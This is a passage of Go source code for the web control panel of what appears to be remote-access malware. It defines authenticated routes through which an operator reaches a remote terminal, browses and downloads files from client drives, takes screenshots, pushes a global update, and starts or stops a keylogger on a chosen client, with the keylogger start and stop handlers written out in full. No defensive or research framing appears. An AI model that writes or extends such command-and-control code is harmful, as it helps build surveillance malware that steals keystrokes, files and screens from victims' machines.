			json.NewEncoder(w).Encode(map[string]string{"error": "Failed to delete user"})
			return
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"status": "success", "message": "User deleted successfully"})

	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// RegisterGinRoutes registers web handler routes with Gin router
func (wh *WebHandler) RegisterGinRoutes(router *gin.Engine) {
	// Load HTML templates
	router.LoadHTMLGlob("web/templates/*.html")

	// Static files
	router.Static("/static", "./web/static")
	router.Static("/assets", "./web/assets")

	// Public routes (no auth required)
	router.GET("/login", wh.ginHandleLogin)
	router.POST("/api/login", wh.ginHandleLoginAPI)
	router.POST("/api/logout", wh.ginHandleLogout)
	router.GET("/api/health", wh.ginHandleHealthAPI)

	// User management API routes
	router.GET("/api/users", wh.ginRequireAuth(wh.ginHandleUsersAPI))
	router.POST("/api/users", wh.ginRequireAuth(wh.ginHandleUsersAPI))
	router.PUT("/api/users/:id", wh.ginRequireAuth(wh.ginHandleUserAPI))
	router.DELETE("/api/users/:id", wh.ginRequireAuth(wh.ginHandleUserAPI))

	// Protected routes
	router.GET("/", func(c *gin.Context) {
		c.Redirect(http.StatusSeeOther, "/dashboard-new")
	})
	router.GET("/dashboard", wh.ginRequireAuth(wh.ginHandleDashboard))
	router.GET("/dashboard-new", wh.ginRequireAuth(wh.ginHandleDashboardNew))
	router.GET("/client-details", wh.ginRequireAuth(wh.ginHandleClientDetails))
	router.GET("/terminal", wh.ginRequireAuth(wh.ginHandleTerminalPage))
	router.GET("/files", wh.ginRequireAuth(wh.ginHandleFilesPage))
	router.POST("/api/files/browse", wh.ginRequireAuth(wh.ginHandleFileBrowse))
	router.POST("/api/files/drives", wh.ginRequireAuth(wh.ginHandleGetDrives))
	router.POST("/api/files/download", wh.ginRequireAuth(wh.ginHandleFileDownload))
	router.GET("/api/screenshot", wh.ginRequireAuth(wh.ginHandleScreenshotRequest))
	router.POST("/api/keylogger/start", wh.ginRequireAuth(wh.ginHandleKeyloggerStart))
	router.POST("/api/keylogger/stop", wh.ginRequireAuth(wh.ginHandleKeyloggerStop))
	router.POST("/api/update/global", wh.ginRequireAuth(wh.ginHandleGlobalUpdate))

	// Clients UI optimization endpoints
	router.POST("/api/clients/update", wh.ginRequireAuth(wh.ginHandleClientUpdatesAPI))
	router.GET("/api/clients/search", wh.ginRequireAuth(wh.ginHandleClientSearchAPI))
}

// ginRequireAuth is Gin middleware for authentication
func (wh *WebHandler) ginRequireAuth(handler gin.HandlerFunc) gin.HandlerFunc {
	return func(c *gin.Context) {
		// Safety check for WebHandler receiver
		if wh == nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
			c.Abort()
			return
		}

		cookie, err := c.Cookie("session_id")
		if err != nil {
			c.Redirect(http.StatusSeeOther, "/login")
			c.Abort()
			return
		}

		if wh.sessionMgr == nil {
			c.Redirect(http.StatusSeeOther, "/login")
			c.Abort()
			return
		}

		session, exists := wh.sessionMgr.GetSession(cookie)
		if !exists {
			c.Redirect(http.StatusSeeOther, "/login")
			c.Abort()
			return
		}

		// Refresh session
		wh.sessionMgr.RefreshSession(session.ID)

		handler(c)
	}
}

// Gin wrapper handlers
func (wh *WebHandler) ginHandleLogin(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleLogin(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleLoginAPI(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleLoginAPI(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleLogout(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleLogout(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleUsersAPI(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleUsersAPI(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleUserAPI(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleUserAPI(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleDashboard(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleDashboard(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleDashboardNew(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleDashboardNew(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleClientDetails(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleClientDetails(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleTerminalPage(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleTerminalPage(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleFilesPage(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleFilesPage(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleFileBrowse(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleFileBrowse(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleGetDrives(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleGetDrives(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleFileDownload(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleFileDownload(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleScreenshotRequest(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleScreenshotRequest(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleGlobalUpdate(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleGlobalUpdate(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleClientsAPI(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleClientsAPI(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleClientUpdatesAPI(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleClientUpdatesAPI(c.Writer, c.Request)
}

func (wh *WebHandler) ginHandleClientSearchAPI(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleClientSearchAPI(c.Writer, c.Request)
}

// HandleKeyloggerStart handles keylogger start requests
func (wh *WebHandler) HandleKeyloggerStart(w http.ResponseWriter, r *http.Request) {
	var req struct {
		ClientID string `json:"client_id"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	if req.ClientID == "" {
		http.Error(w, "Client ID required", http.StatusBadRequest)
		return
	}

	// Send start keylogger message to client
	msg, err := protocol.NewMessage(protocol.MsgTypeStartKeylogger, protocol.KeyloggerPayload{})
	if err != nil {
		log.Printf("Failed to create start keylogger message: %v", err)
		http.Error(w, "Failed to create request", http.StatusInternalServerError)
		return
	}

	if err := wh.clientMgr.SendToClient(req.ClientID, msg); err != nil {
		log.Printf("Failed to send start keylogger message to %s: %v", req.ClientID, err)
		http.Error(w, "Failed to send request", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "started",
		"message": "Keylogger started",
	})
	log.Printf("Keylogger started for client %s", req.ClientID)
}

// HandleKeyloggerStop handles keylogger stop requests
func (wh *WebHandler) HandleKeyloggerStop(w http.ResponseWriter, r *http.Request) {
	var req struct {
		ClientID string `json:"client_id"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	if req.ClientID == "" {
		http.Error(w, "Client ID required", http.StatusBadRequest)
		return
	}

	// Send stop keylogger message to client
	msg, err := protocol.NewMessage(protocol.MsgTypeStopKeylogger, protocol.KeyloggerPayload{})
	if err != nil {
		log.Printf("Failed to create stop keylogger message: %v", err)
		http.Error(w, "Failed to create request", http.StatusInternalServerError)
		return
	}

	if err := wh.clientMgr.SendToClient(req.ClientID, msg); err != nil {
		log.Printf("Failed to send stop keylogger message to %s: %v", req.ClientID, err)
		http.Error(w, "Failed to send request", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "stopped",
		"message": "Keylogger stopped",
	})
	log.Printf("Keylogger stopped for client %s", req.ClientID)
}

// Gin wrapper for HandleKeyloggerStart
func (wh *WebHandler) ginHandleKeyloggerStart(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleKeyloggerStart(c.Writer, c.Request)
}

// Gin wrapper for HandleKeyloggerStop
func (wh *WebHandler) ginHandleKeyloggerStop(c *gin.Context) {
	if wh == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
		return
	}
	wh.HandleKeyloggerStop(c.Writer, c.Request)
}
